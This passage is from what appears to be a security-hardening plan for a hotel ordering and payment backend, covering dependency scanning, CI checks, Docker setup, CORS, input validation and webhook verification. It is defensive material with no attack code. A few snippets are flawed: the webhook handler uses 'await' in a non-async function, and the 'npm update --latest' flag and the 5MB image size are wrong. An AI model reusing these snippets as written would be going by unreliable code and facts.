| Strict CSP (nonces)    | 🔹 **LOW**      | Post-launch | 2-3 hours | Free |

**Total Effort (Critical + High)**: 4-5 hours
**Cost**: $0 (all free)

---

### 📚 User-Facing Security Resources

**Libraries**:

- `helmet`: https://www.npmjs.com/package/helmet
- `csurf`: https://www.npmjs.com/package/csurf
- `dompurify`: https://www.npmjs.com/package/dompurify
- `express-session`: https://www.npmjs.com/package/express-session

**Documentation**:

- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- CSP Guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- Cookie security: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

**Testing**:

- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Security Headers: https://securityheaders.com/

---

## 9. Operational Security

### 📦 Dependency Scanning (npm audit & Snyk)

**What it is**: Regularly scan dependencies for known vulnerabilities and outdated packages.

**Why Critical**:

- ✅ Prevent supply chain attacks
- ✅ Fix known vulnerabilities
- ✅ Stay ahead of exploits
- ✅ Compliance requirements

---

### 🔍 npm audit (Built-in, Free)

**Current Status**: ⚠️ Not regularly performed

**Usage**:

```bash
# Check for vulnerabilities
npm audit

# Auto-fix vulnerabilities (where possible)
npm audit fix

# Force fix (may introduce breaking changes)
npm audit fix --force

# Get detailed report
npm audit --json > audit-report.json
```

**Example Output**:

```
found 3 vulnerabilities (1 low, 2 high)
  run `npm audit fix` to fix them, or `npm audit` for details
```

---

**Automated npm audit** (package.json):

```json
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:prod": "npm audit --production",
    "pretest": "npm audit --audit-level=moderate"
  }
}
```

**Run before deployment**:

```bash
npm run audit:prod  # Only check production dependencies
```

---

### 🛡️ Snyk (Advanced, Free Tier Available)

**What it is**: More comprehensive vulnerability scanning + automated fixes.

**Features**:

- ✅ Find vulnerabilities in dependencies
- ✅ Automated pull requests to fix issues
- ✅ License compliance checking
- ✅ Docker image scanning
- ✅ Continuous monitoring

**Installation**:

```bash
# Install globally
npm install -g snyk

# Authenticate
snyk auth

# Test project
snyk test

# Monitor project (continuous monitoring)
snyk monitor
```

**Example Output**:

```
Testing /path/to/seashell-backend...

✗ Medium severity vulnerability found in express
  Description: Denial of Service
  Info: https://snyk.io/vuln/SNYK-JS-EXPRESS-12345
  Introduced through: express@4.17.1
  Fixed in: express@4.18.2

Tested 1048 dependencies for known vulnerabilities, found 1 issue.
```

---

**Auto-fix with Snyk**:

```bash
# Fix vulnerabilities
snyk fix

# Wizard mode (interactive)
snyk wizard
```

**GitHub Integration** (Recommended):

1. Go to https://snyk.io/
2. Connect GitHub repository
3. Snyk auto-scans on every push
4. Auto-creates PRs for fixes

---

### 🔄 Patch Management (Keep Dependencies Updated)

**What it is**: Regularly update Node.js, Express, and npm packages to latest secure versions.

**Current Status**: ⚠️ Manual updates

---

### 📊 Check Outdated Packages

```bash
# List outdated packages
npm outdated

# Example output:
# Package     Current  Wanted  Latest  Location
# express     4.17.1   4.17.3  4.18.2  node_modules/express
# axios       0.21.1   0.21.4  1.4.0   node_modules/axios
```

**Update Strategy**:

```bash
# Update to "wanted" version (safe, respects semver)
npm update

# Update to latest (may have breaking changes)
npm install express@latest
npm install axios@latest

# Update all to latest (risky!)
npm update --latest
```

---

### 🤖 Dependabot (GitHub, Free)

**What it is**: Automated dependency updates via pull requests.

**Setup** (`.github/dependabot.yml`):

```yaml
version: 2
updates:
  # Backend dependencies
  - package-ecosystem: "npm"
    directory: "/seashell-backend"
    schedule:
      interval: "weekly" # or "daily", "monthly"
    open-pull-requests-limit: 5
    reviewers:
      - "yourusername"
    assignees:
      - "yourusername"
    labels:
      - "dependencies"
      - "security"
    # Only security updates
    versioning-strategy: "increase-if-necessary"

  # Frontend dependencies
  - package-ecosystem: "npm"
    directory: "/apps/menu-app"
    schedule:
      interval: "weekly"
```

**Benefits**:

- ✅ Auto-creates PRs for updates
- ✅ Security updates prioritized
- ✅ Grouped updates (e.g., all patch updates together)
- ✅ Free for public & private repos

---

### 🔐 Node.js Version Management

**Check Node version**:

```bash
node --version  # Should be v18+ or v20+
```

**Recommended**: Use LTS (Long Term Support) versions

**Update Node.js**:

```bash
# Using nvm (recommended)
nvm install --lts
nvm use --lts

# Or download from nodejs.org
```

**Lock Node version** (package.json):

```json
{
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

---

### 🔨 CI/CD Security Checks

**What it is**: Automated security scanning in your deployment pipeline.

**Current Status**: ⚠️ No CI/CD pipeline

**Recommended Pipeline** (GitHub Actions):

Create `.github/workflows/security-checks.yml`:

```yaml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: "18"
          cache: "npm"

      - name: Install dependencies
        run: npm ci
        working-directory: ./seashell-backend

      # 1. npm audit
      - name: Run npm audit
        run: npm audit --audit-level=high
        working-directory: ./seashell-backend
        continue-on-error: false

      # 2. Snyk scan
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          command: test
          args: --severity-threshold=high

      # 3. Linting
      - name: Run ESLint
        run: npm run lint
        working-directory: ./seashell-backend

      # 4. Tests
      - name: Run tests
        run: npm test
        working-directory: ./seashell-backend
        env:
          NODE_ENV: test

      # 5. Security headers check
      - name: Check security headers
        run: |
          npm start &
          sleep 5
          npx check-headers http://localhost:4000
        working-directory: ./seashell-backend
```

---

### ✅ ESLint Security Plugin

**Install security linting**:

```bash
npm install --save-dev eslint eslint-plugin-security
```

**Configure** (`.eslintrc.json`):

```json
{
  "extends": ["eslint:recommended"],
  "plugins": ["security"],
  "rules": {
    "security/detect-object-injection": "warn",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-unsafe-regex": "error",
    "security/detect-buffer-noassert": "error",
    "security/detect-child-process": "warn",
    "security/detect-disable-mustache-escape": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-no-csrf-before-method-override": "error",
    "security/detect-non-literal-fs-filename": "warn",
    "security/detect-non-literal-require": "warn",
    "security/detect-possible-timing-attacks": "warn",
    "security/detect-pseudoRandomBytes": "error"
  }
}
```

**Run linting**:

```bash
npm run lint
```

---

### 🧪 Automated Testing

**Add in CI/CD**:

```json
// package.json
{
  "scripts": {
    "test": "jest",
    "test:security": "npm audit && npm run lint",
    "test:e2e": "cypress run"
  }
}
```

**Security-focused tests**:

```javascript
// tests/security.test.js
describe("Security Tests", () => {
  test("should not expose sensitive headers", async () => {
    const response = await request(app).get("/health");
    expect(response.headers["x-powered-by"]).toBeUndefined();
  });

  test("should have CORS configured", async () => {
    const response = await request(app).get("/api/orders");
    expect(response.headers["access-control-allow-origin"]).toBeDefined();
  });

  test("should reject requests without CSRF token", async () => {
    const response = await request(app)
      .post("/payment/checkout")
      .send({ amount: 10 });
    expect(response.status).toBe(403);
  });
});
```

---

### 🐳 Containerization (Docker)

**What it is**: Package your app in Docker containers for consistent, secure deployments.

**Benefits**:

- ✅ Consistent environments (dev = prod)
- ✅ Isolation (security boundary)
- ✅ Minimal attack surface
- ✅ Easy rollbacks

---

### 📝 Dockerfile (Production-Ready)

**Create** `seashell-backend/Dockerfile`:

```dockerfile
# Use minimal base image
FROM node:18-alpine AS base

# Set working directory
WORKDIR /app

# Copy package files
COPY package*.json ./

# Install production dependencies only
RUN npm ci --only=production && \
    npm cache clean --force

# Copy application code
COPY . .

# Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

# Set ownership
RUN chown -R nodejs:nodejs /app

# Switch to non-root user
USER nodejs

# Expose port
EXPOSE 4000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node -e "require('http').get('http://localhost:4000/health', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"

# Start application
CMD ["node", "server.js"]
```

**Why alpine?**

- 5MB base image (vs. 900MB for full Node image)
- Fewer packages = smaller attack surface
- Still fully functional

---

### 🔒 Docker Security Best Practices

**.dockerignore** (Keep secrets out):

```
node_modules
npm-debug.log
.env
.env.local
.git
.gitignore
README.md
.vscode
.DS_Store
coverage
.nyc_output
```

---

**Multi-stage build** (even smaller image):

```dockerfile
# Build stage
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
# If you have a build step:
# RUN npm run build

# Production stage
FROM node:18-alpine
WORKDIR /app

# Copy only necessary files from builder
COPY --from=builder /app/package*.json ./
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app .

# Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001 && \
    chown -R nodejs:nodejs /app

USER nodejs

EXPOSE 4000
CMD ["node", "server.js"]
```

**Result**: ~50MB image (vs. 1GB+)

---

### 🏗️ Docker Compose (Local Development)

**Create** `docker-compose.yml`:

```yaml
version: "3.8"

services:
  backend:
    build:
      context: ./seashell-backend
      dockerfile: Dockerfile
    ports:
      - "4000:4000"
    environment:
      - NODE_ENV=development
      - PORT=4000
    env_file:
      - ./seashell-backend/.env.local
    volumes:
      - ./seashell-backend:/app
      - /app/node_modules # Don't override node_modules
    restart: unless-stopped
    networks:
      - seashell-network

networks:
  seashell-network:
    driver: bridge
```

**Run**:

```bash
docker-compose up -d
docker-compose logs -f backend
```

---

### 🔍 Docker Image Scanning

**Scan for vulnerabilities**:

```bash
# Using Docker Scout (built-in)
docker scout cves seashell-backend:latest

# Using Trivy (recommended)
docker run aquasec/trivy image seashell-backend:latest

# Using Snyk
snyk container test seashell-backend:latest
```

**Example Trivy output**:

```
seashell-backend:latest (alpine 3.18)
Total: 2 (CRITICAL: 0, HIGH: 0, MEDIUM: 1, LOW: 1)

┌─────────────┬──────────┬──────────┬───────────────────┐
│  Library    │ Severity │ Installed│ Fixed Version     │
├─────────────┼──────────┼──────────┼───────────────────┤
│ openssl     │ MEDIUM   │ 1.1.1k   │ 1.1.1l            │
└─────────────┴──────────┴──────────┴───────────────────┘
```

---

### 🚀 CI/CD with Docker

**Add to GitHub Actions**:

```yaml
name: Build and Push Docker Image

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Login to Docker Hub
        uses: docker/login-action@v2
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: Build and push
        uses: docker/build-push-action@v4
        with:
          context: ./seashell-backend
          push: true
          tags: yourusername/seashell-backend:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Scan image with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: yourusername/seashell-backend:latest
          format: "sarif"
          output: "trivy-results.sarif"

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: "trivy-results.sarif"
```

---

### ✅ Operational Security Checklist

**Dependency Scanning**:

- [ ] Run `npm audit` weekly
- [ ] Set up Snyk monitoring
- [ ] Enable Dependabot for auto-updates
- [ ] Review and merge security PRs promptly
- [ ] Document approved dependency versions

**Patch Management**:

- [ ] Check for outdated packages monthly
- [ ] Update Node.js to latest LTS
- [ ] Update critical dependencies immediately
- [ ] Test updates in staging before production
- [ ] Maintain changelog of updates

**CI/CD Security**:

- [ ] Set up GitHub Actions (or equivalent)
- [ ] Add npm audit to CI pipeline
- [ ] Add Snyk scanning
- [ ] Add ESLint security rules
- [ ] Add automated tests
- [ ] Fail builds on high/critical vulnerabilities
- [ ] Scan Docker images before deploy

**Containerization**:

- [ ] Create optimized Dockerfile
- [ ] Use alpine base image
- [ ] Run as non-root user
- [ ] Add .dockerignore
- [ ] Scan images for vulnerabilities
- [ ] Use multi-stage builds
- [ ] Set resource limits
- [ ] Add health checks

---

### 🎯 Operational Security Priority Matrix

| Feature                  | Priority        | When        | Effort      | Cost      |
| ------------------------ | --------------- | ----------- | ----------- | --------- |
| npm audit (regular)      | ⚠️ **CRITICAL** | Immediately | 15 min/week | Free      |
| Dependabot setup         | ⚠️ **CRITICAL** | Before prod | 30 min      | Free      |
| ESLint security rules    | ⚠️ **HIGH**     | Before prod | 1 hour      | Free      |
| Basic CI/CD pipeline     | ⚠️ **HIGH**     | Before prod | 2-3 hours   | Free      |
| Snyk monitoring          | ⚠️ **HIGH**     | Before prod | 30 min      | Free tier |
| Docker containerization  | 💡 **MEDIUM**   | Before prod | 3-4 hours   | Free      |
| Advanced CI/CD (tests)   | 💡 **MEDIUM**   | Post-launch | 4-6 hours   | Free      |
| Docker image scanning    | 💡 **MEDIUM**   | With Docker | 30 min      | Free      |
| Automated security tests | 🔹 **LOW**      | Post-launch | 4-6 hours   | Free      |

**Total Effort (Critical + High)**: 4-6 hours
**Cost**: $0 (all free with free tiers)

---

### 📚 Operational Security Resources

**Dependency Scanning**:

- npm audit: https://docs.npmjs.com/cli/v8/commands/npm-audit
- Snyk: https://snyk.io/
- Dependabot: https://github.com/dependabot
- OWASP Dependency Check: https://owasp.org/www-project-dependency-check/

**CI/CD**:

- GitHub Actions: https://docs.github.com/en/actions
- GitLab CI: https://docs.gitlab.com/ee/ci/
- CircleCI: https://circleci.com/

**Docker Security**:

- Docker Best Practices: https://docs.docker.com/develop/dev-best-practices/
- Trivy Scanner: https://github.com/aquasecurity/trivy
- Docker Scout: https://docs.docker.com/scout/
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker

**Node.js Security**:

- Node.js Security Best Practices: https://nodejs.org/en/docs/guides/security/
- OWASP Node.js Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html

---

### 🔄 Maintenance Schedule

**Weekly**:

- [ ] Run `npm audit`
- [ ] Review Snyk alerts
- [ ] Check for critical updates

**Monthly**:

- [ ] Review all security alerts
- [ ] Update dependencies
- [ ] Review CI/CD logs
- [ ] Check Docker image sizes

**Quarterly**:

- [ ] Major dependency updates
- [ ] Security audit
- [ ] Review and update security policies
- [ ] Test disaster recovery

**Annually**:

- [ ] Comprehensive security review
- [ ] Penetration testing (optional)
- [ ] Update documentation
- [ ] Rotate secrets/keys

---

## 10. Additional Security Considerations

### 🔑 Environment Variable Security

**Current Status**: ✅ Using `.env.local` (not committed to Git)

**Recommendations**:

| Action                              | Priority     | Phase        |
| ----------------------------------- | ------------ | ------------ |
| Never commit `.env.local` to Git    | **CRITICAL** | **Active** ✓ |
| Use platform secret management      | **HIGH**     | Production   |
| Rotate Hesabe keys periodically     | **MEDIUM**   | Production   |
| Use different keys for sandbox/prod | **HIGH**     | **Active** ✓ |

**Production Secret Management**:

- **Firebase**: Use `firebase functions:config:set`
- **Vercel**: Use Vercel Environment Variables UI
- **Railway/Render**: Use platform dashboard

---

### 🔒 API Endpoint Protection

**Current Status**: Public endpoints (no auth)

**Considerations**:

| Security Measure    | Needed?      | Reason                        |
| ------------------- | ------------ | ----------------------------- |
| API key for backend | **Optional** | Internal hotel network        |
| CORS restrictions   | **YES**      | Already implemented ✓         |
| Request signing     | **No**       | Hesabe handles this           |
| IP whitelisting     | **Optional** | For management endpoints only |

**Current CORS (Good)**:

```javascript
app.use(
  cors({
    origin: ["http://localhost:3000", "http://localhost:5173"],
    credentials: true,
  }),
);
```

**Production CORS**:

```javascript
app.use(
  cors({
    origin:
      process.env.NODE_ENV === "production"
        ? ["https://yourdomain.com"]
        : ["http://localhost:3000", "http://localhost:5173"],
    credentials: true,
  }),
);
```

---

### 📝 Logging & Monitoring

**What to Log**:

| Event               | Current Status | Recommended             |
| ------------------- | -------------- | ----------------------- |
| Payment initiation  | ✅ Console     | Add timestamp, IP       |
| Payment success     | ✅ Console     | Add to database         |
| Payment failure     | ✅ Console     | Add to database + alert |
| Suspicious activity | ❌ None        | Add detection           |

**Recommended Logging**:

```javascript
// Payment audit log
{
  timestamp: new Date().toISOString(),
  event: 'payment_initiated',
  amount: '0.500',
  orderRef: 'ORDER-123456',
  roomNumber: '101',
  ip: req.ip,
  userAgent: req.get('user-agent'),
  status: 'success'
}
```

**Tools for Production**:

- **Free**: Console + Firebase Analytics
- **Paid**: Sentry (errors), LogRocket (sessions), Datadog (monitoring)

---

### 🛑 Input Validation & Sanitization

**Current Status**: Basic validation

**Recommendations**:

| Input           | Current     | Recommended              |
| --------------- | ----------- | ------------------------ |
| Amount          | Basic check | Min/max validation ✓     |
| Room number     | None        | Regex validation         |
| Order reference | Generated   | Already secure ✓         |
| Variables 1-5   | None        | Length limits + sanitize |

**Implementation**:

```javascript
// Add validation middleware
const { body, validationResult } = require("express-validator");

router.post(
  "/checkout",
  [
    body("amount")
      .isFloat({ min: 0.2, max: 9999.999 })
      .withMessage("Invalid amount"),
    body("variable1") // room number
      .optional()
      .isLength({ max: 10 })
      .matches(/^[A-Z0-9]+$/i)
      .withMessage("Invalid room number"),
    // ... more validations
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // ... proceed with checkout
  },
);
```

---

### 💾 Data Protection

**What You Store**:

- ❌ **NO card data** (Hesabe handles this) ✓
- ✅ Order details (room, items, amount)
- ✅ Payment status (success/failed)
- ✅ Transaction references

**Recommendations**:

| Data Type          | Storage   | Retention            |
| ------------------ | --------- | -------------------- |
| Order details      | Firebase  | 90 days              |
| Payment IDs        | Firebase  | 7 years (compliance) |
| Customer card info | **NEVER** | N/A                  |
| Failed attempts    | Logs only | 30 days              |

**Firebase Security Rules** (already set?):

```javascript
// Ensure only authenticated staff can read orders
match /orders/{orderId} {
  allow read, write: if request.auth != null
    && request.auth.token.role == 'staff';
}
```

---

### 🔐 Webhook Security

**Current Status**: Basic webhook endpoint

**Recommendations**:

| Security Measure        | Priority     | Implementation               |
| ----------------------- | ------------ | ---------------------------- |
| Verify Hesabe signature | **HIGH**     | Check webhook docs           |
| HTTPS only (prod)       | **HIGH**     | Hosting platform             |
| Idempotency check       | **MEDIUM**   | Prevent duplicate processing |
| IP whitelist            | **OPTIONAL** | Hesabe's IPs only            |

**Implementation**:

```javascript
router.post('/webhook', (req, res) => {
  // 1. Verify it's from Hesabe (check signature/IP)
  const signature = req.headers['x-hesabe-signature'];
  if (!verifyHesabeSignature(req.body, signature)) {
    return res.status(401).json({ error: 'Invalid signature' });
  }

  // 2. Check for duplicate processing
  const webhookId = req.body.Id;
  if (await isWebhookProcessed(webhookId)) {
    return res.status(200).json({ status: 'already_processed' });
  }

  // 3. Process webhook
  // ...
});
```

---

## Implementation Priorities

### 🚨 **CRITICAL (Must Have for Production)**

1. **HTTPS Everywhere** - Automatic with hosting platform
2. **Rate Limiting** - Implement now, stricter in prod
3. **Environment Secret Management** - Use platform secrets
4. **CORS Configuration** - Update for production domain

**Timeline**: Before going live
**Effort**: 1 hour total
**Cost**: Free

---

### ⚠️ **HIGH Priority (Should Have)**

1. **HSTS Headers** - Add middleware
2. **Input Validation** - Add express-validator
3. **Webhook Signature Verification** - Check Hesabe docs
4. **Production Logging** - Structured logs + monitoring

**Timeline**: During deployment
**Effort**: 2-3 hours
**Cost**: Free to $20/month (monitoring tools)

---

### 💡 **MEDIUM Priority (Nice to Have)**

1. **WAF/Firewall** - Use platform features
2. **Payment Audit Logging** - Store in database
3. **Webhook Idempotency** - Prevent duplicates
4. **TLS 1.2+ Enforcement** - Platform handles this

**Timeline**: Post-launch improvements
**Effort**: 2-4 hours
**Cost**: Included with platform

---

### 🔹 **LOW Priority (Optional)**

1. **IP Whitelisting** - Hotel network only
2. **Advanced Monitoring** - DataDog/Sentry
3. **Automated Security Scanning** - Snyk/Dependabot
4. **Penetration Testing** - Annual review

**Timeline**: Ongoing maintenance
**Effort**: Varies
**Cost**: $0-$500/year

---

## Current Security Status

### ✅ **Already Implemented**

- ✅ Environment variables in `.env.local` (not in Git)
- ✅ CORS protection
- ✅ Hesabe encryption (AES-256-CBC)
- ✅ No card data storage
- ✅ HTTPS for Hesabe API calls
- ✅ Basic error handling
- ✅ Secure callback URLs
- ✅ Encrypted payment data

### ⚠️ **To Be Implemented**

#### Development Phase:

- [ ] Rate limiting (test behavior)
- [ ] Input validation
- [ ] Enhanced logging

#### Production Phase:

- [ ] HTTPS deployment
- [ ] HSTS headers
- [ ] Production CORS config
- [ ] Platform secret management
- [ ] Webhook signature verification
- [ ] Monitoring setup

---

## Security Checklist for Going Live

### Pre-Deployment:

- [ ] All `.env` files excluded from Git
- [ ] Production secrets configured in platform
- [ ] CORS updated with production domain
- [ ] Rate limits configured
- [ ] Input validation added
- [ ] Error messages sanitized (no sensitive data)

### Post-Deployment:

- [ ] HTTPS working correctly
- [ ] Payment flow tested end-to-end
- [ ] Webhooks tested
- [ ] Logs monitored for errors
- [ ] Rate limiting tested
- [ ] Alert system configured (email/SMS for failures)

### Ongoing:

- [ ] Monitor failed payments weekly
- [ ] Review security logs monthly
- [ ] Rotate Hesabe keys annually
- [ ] Update dependencies quarterly
- [ ] Test disaster recovery plan

---

## Recommendations Summary

### **For Your Hotel Use Case**:

**Essential (Do These)**:

1. ✅ HTTPS in production (automatic with hosting)
2. ✅ Rate limiting on payment endpoints
3. ✅ Basic input validation
4. ✅ Secure environment variable management

**Nice to Have**:

1. ⚠️ HSTS headers
2. ⚠️ Enhanced logging
3. ⚠️ Webhook verification

**Skip (Not Critical)**:

1. ❌ Complex WAF rules (platform handles basics)
2. ❌ IP whitelisting (unless VPN/internal network)
3. ❌ Advanced intrusion detection

### **Why This Approach Works**:

- ✅ Hotel internal system (limited public exposure)
- ✅ Hesabe handles all payment security (PCI compliant)
- ✅ You don't store card data
- ✅ Modern hosting platforms provide many features automatically
- ✅ Focus effort on actual application logic vs. infrastructure

---

**Next Steps**: Review additional security suggestions, then we'll create an implementation plan based on priority!
